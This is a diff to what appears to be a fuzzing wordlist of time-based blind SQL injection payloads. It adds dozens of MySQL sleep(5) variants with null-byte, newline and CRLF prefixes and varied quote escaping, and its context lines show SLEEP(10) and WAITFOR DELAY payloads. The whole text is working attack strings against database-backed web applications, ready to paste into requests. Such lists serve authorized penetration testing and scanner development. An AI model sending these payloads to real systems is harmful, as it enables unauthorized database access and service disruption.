+0x00 or 1337=(select 1337 from (select sleep(5))A)
+0x00 or 1337=(select 1337 from (select sleep(5))A) -- 
+0x00 or sleep(5)
+0x00 or sleep(5) -- 
+0x00;select sleep(5)
+0x00;select sleep(5) -- 
+0x00' and 1337=(select 1337 from (select sleep(5))A) -- 
+0x00' and sleep(5) -- 
+0x00' or 1337=(select 1337 from (select sleep(5))A) -- 
+0x00' or sleep(5) -- 
+0x00';select sleep(5) -- 
+0x00\' and 1337=(select 1337 from (select sleep(5))A) -- 
+0x00\' and sleep(5) -- 
+0x00\' or 1337=(select 1337 from (select sleep(5))A) -- 
+0x00\' or sleep(5) -- 
+0x00\';select sleep(5) -- 
+0x00\\' and 1337=(select 1337 from (select sleep(5))A) -- 
+0x00\\' and sleep(5) -- 
+0x00\\' or 1337=(select 1337 from (select sleep(5))A) -- 
+0x00\\' or sleep(5) -- 
+0x00\\';select sleep(5) -- 
+0x00sleep(5)
+0x00sleep(5) -- 
+0x0a and 1337=(select 1337 from (select sleep(5))A)
+0x0a and 1337=(select 1337 from (select sleep(5))A) -- 
+0x0a and sleep(5)
+0x0a and sleep(5) -- 
+0x0a or 1337=(select 1337 from (select sleep(5))A)
+0x0a or 1337=(select 1337 from (select sleep(5))A) -- 
+0x0a or sleep(5)
+0x0a or sleep(5) -- 
+0x0a;select sleep(5)
+0x0a;select sleep(5) -- 
+0x0a' and 1337=(select 1337 from (select sleep(5))A) -- 
+0x0a' and sleep(5) -- 
+0x0a' or 1337=(select 1337 from (select sleep(5))A) -- 
+0x0a' or sleep(5) -- 
+0x0a';select sleep(5) -- 
+0x0a\' and 1337=(select 1337 from (select sleep(5))A) -- 
+0x0a\' and sleep(5) -- 
+0x0a\' or 1337=(select 1337 from (select sleep(5))A) -- 
+0x0a\' or sleep(5) -- 
+0x0a\';select sleep(5) -- 
+0x0a\\' and 1337=(select 1337 from (select sleep(5))A) -- 
+0x0a\\' and sleep(5) -- 
+0x0a\\' or 1337=(select 1337 from (select sleep(5))A) -- 
+0x0a\\' or sleep(5) -- 
+0x0a\\';select sleep(5) -- 
+0x0asleep(5)
+0x0asleep(5) -- 
+0x0d0a and 1337=(select 1337 from (select sleep(5))A)
+0x0d0a and 1337=(select 1337 from (select sleep(5))A) -- 
+0x0d0a and sleep(5)
+0x0d0a and sleep(5) -- 
+0x0d0a or 1337=(select 1337 from (select sleep(5))A)
+0x0d0a or 1337=(select 1337 from (select sleep(5))A) -- 
+0x0d0a or sleep(5)
+0x0d0a or sleep(5) -- 
+0x0d0a;select sleep(5)
+0x0d0a;select sleep(5) -- 
+0x0d0a' and 1337=(select 1337 from (select sleep(5))A) -- 
+0x0d0a' and sleep(5) -- 
+0x0d0a' or 1337=(select 1337 from (select sleep(5))A) -- 
+0x0d0a' or sleep(5) -- 
+0x0d0a';select sleep(5) -- 
+0x0d0a\' and 1337=(select 1337 from (select sleep(5))A) -- 
+0x0d0a\' and sleep(5) -- 
+0x0d0a\' or 1337=(select 1337 from (select sleep(5))A) -- 
+0x0d0a\' or sleep(5) -- 
+0x0d0a\';select sleep(5) -- 
+0x0d0a\\' and 1337=(select 1337 from (select sleep(5))A) -- 
+0x0d0a\\' and sleep(5) -- 
+0x0d0a\\' or 1337=(select 1337 from (select sleep(5))A) -- 
+0x0d0a\\' or sleep(5) -- 
+0x0d0a\\';select sleep(5) -- 
+0x0d0asleep(5)
+0x0d0asleep(5) -- 
 1
 1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY) AND (1337=1337
 1 AND (SELECT 1337 FROM (SELECT(SLEEP(10)))YYYY)-- 1337
@@ -1105,7 +1105,7 @@ or SLEEP(10)='
 or SLEEP(10)="
 or WAITFOR DELAY '0:0:10'
 or WAITFOR DELAY '0:0:10'--
-sleep(120)
-sleep(120) -- 
+sleep(5)
+sleep(5) -- 
 WAITFOR DELAY '0:0:10'
 waitfor delay '0:0:10'--
